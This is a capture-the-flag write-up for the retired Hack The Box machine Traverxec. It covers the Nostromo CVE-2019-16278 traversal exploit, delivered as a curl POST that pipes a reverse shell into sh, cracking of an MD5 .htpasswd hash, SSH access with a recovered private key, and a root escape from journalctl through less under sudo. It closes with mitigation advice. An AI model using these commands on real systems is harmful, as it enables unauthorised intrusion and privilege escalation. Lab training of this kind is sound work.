---
machine: Traverxec
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, nostromo, cve, privesc]
---

# Traverxec — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Nostromo 1.9.6 is vulnerable to CVE-2019-16278: traversal in `/%2e%2e/` runs commands as `www-data`. `~david/public_html` exposes a `.htpasswd` whose hash cracks and whose password is reused over SSH. The home directory holds a backup with a private key; `david` can run `journalctl` with sudo and escape to a root shell from `less`.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` nostromo 1.9.6.
- `gobuster` finds `/~david/` and `/icons/`.
- The main page mentions a minimalist web service.

## Enumeration

- `http://<IP>/~david/` lists a personal directory with `.htpasswd`.
- The hash is `$1$` (MD5 crypt) and cracks with `hashcat -m 500`.
- The recovered password is tried over SSH for `david`.

## Foothold

Exploit CVE-2019-16278 with a POST to `/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh` and the command in the body. The response can be used for a reverse shell as `www-data`.

```bash
curl -s -X POST 'http://<IP>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo <BASE64_REVERSE_SHELL>|base64 -d|sh'
```

## Lateral movement

`/home/david` contains `public_www` and a `backup` directory with a `.tgz` holding `id_rsa`. The key allows SSH as `david`.

```bash
tar -xzf ~/backup/home.tgz -C /tmp
ssh -i /tmp/id_rsa david@<IP>
```

## Privilege escalation

`david` can run `/usr/bin/journalctl` as root. `journalctl` opens `less`, and from `less` a shell is launched with `!sh`; the process inherits sudo privileges.

```bash
sudo /usr/bin/journalctl -f
!sh
```

## Evidence

- Nostromo 1.9.6 and traversal in `/%2e%2e/`.
- `.htpasswd` and cracked password.
- Backup with private key and SSH as `david`.
- `journalctl` with sudo and `less` escape.

## Lessons learned

- An old web server with traversal gives unauthenticated execution.
- Personal directories should not expose `.htpasswd`.
- A privileged pager allows command execution.

## Mitigation and detection

- Update Nostromo and normalize paths.
- Do not publish authentication files or backups in the webroot.
- Restrict `journalctl` through sudo and use `--no-pager`.

## References

- [0xdf — Traverxec](https://0xdf.gitlab.io/2020/04/11/htb-traverxec.html)
- [IppSec — Traverxec](https://www.youtube.com/watch?v=6_C9ShH9v2w)
- [Hack The Box — Traverxec](https://app.hackthebox.com/machines/traverxec)
